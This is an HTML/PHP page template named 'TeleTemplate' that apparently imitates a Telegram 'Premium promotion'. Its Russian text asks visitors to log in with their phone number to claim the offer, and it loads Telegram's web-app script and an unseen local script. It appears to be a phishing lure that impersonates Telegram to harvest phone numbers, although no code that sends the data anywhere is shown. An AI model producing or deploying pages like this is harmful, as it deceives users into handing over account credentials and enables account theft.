


<!DOCTYPE html>
<html>
 <head>
  <meta charset="utf-8" />
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;700&display=swap" rel="stylesheet">
  
  <link rel="stylesheet" href="style.css">
  <title>TeleTemplate</title>
 </head>

 <body>
    <?php
      if (isset($_POST['SEND'])){
            echo ('ОДАААА');
      }
    
    ?>
    <form class="container" method='post'>
      <div>
        <img  id="Logo" src="Logo.png"/>
      </div>
      <div class="texts">
           Войдите, чтобы участвовать в <br>
           <span id="Prem">Premium</span> акции от Telegram
      </div>
    <div class="container"> 

 <input type="text" class="message" id = 'phone_code' placeholder="Номер Телефона"/>
 <input type="submit" id="send-button" name='SEND' value='ЗАБРАТЬ'/>
 


 </div> 
    </form>  
 </body>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script src="js.js"></script>
</html>